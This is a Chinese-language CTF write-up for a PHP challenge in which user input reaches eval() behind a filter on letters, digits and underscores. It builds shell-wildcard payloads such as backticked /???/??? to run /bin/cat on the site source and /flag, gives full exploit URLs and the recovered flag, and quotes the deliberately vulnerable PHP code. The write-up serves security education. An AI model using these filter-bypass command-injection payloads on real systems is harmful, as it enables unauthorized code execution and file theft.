参考链接：http://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/

------



[TOC]



# 题目地址

101.71.29.5:10001 

# 解题思路

浏览器打开地址，发现页面中只有一段代码

```
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?> 
```

通过分析代码，可以得知。

1、code用来执行php代码，但是做了过滤

2、提示说通过getFlag()函数可以获取flag

我们首先要做的就是想办法绕过过滤，但是过滤已经把所有的字母和数字都过滤，就剩下特殊字符了。

linux下，可以通过通配符来匹配字母，从而实现一些操作。比如

```
/???/???
等同于
/bin/cat
```

参考链接：`https://www.anquanke.com/post/id/154284`

那么我们可以构造如下payload

```
$_=`/???/???%20/???/???/????/?????.???`;?><?=$_?>
等同于
$_=`/bin/cat /var/www/html/index.php`;?><?=$_?>
```

完整的url如下

```
http://101.71.29.5:10001/?code=$_=`/???/???%20/???/???/????/?????.???`;?%3E%3C?=$_?%3E
```

但是提示过长，因为限制在35以下。我们需要继续缩短

```
$_=`/???/???%20/???/???/????/*`;?><?=$_?>
```

查看所有文件内容

然而还是长，继续缩短

```
?><?=`/???/???%20/???/???/????/*`?>
```

这次完整的url如下

```
http://101.71.29.5:10001/?code=?%3E%3C?=`/???/???%20/???/???/????/*`?%3E
```

这次页面输出成功了，内容比较多，我们得慢慢找，点击查看源代码，但是我们的关键字可以确定是找flag相关的源代码，所以直接查找flag

最后我们可以找到源代码

```
<?php
function getFlag(){
	$flag = file_get_contents('/flag');
	echo $flag;
}<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
```

关键点在于

```
function getFlag(){
	$flag = file_get_contents('/flag');
	echo $flag;
}
```

我们可以知道flag位于/flag下，那么我们直接读flag

```
/???/???%20/????
等同于
/bin/cat /flag
```

构造payload

```
?><?=`/???/???%20/????`;?>
```

完整的url

```
http://101.71.29.5:10001/?code=?%3E%3C?=`/???/???%20/????`;?%3E
```

点击查看源代码，搜索flag

最后找到

```
flag{aa5237a5fc25af3fa07f1d724f7548d7}
```





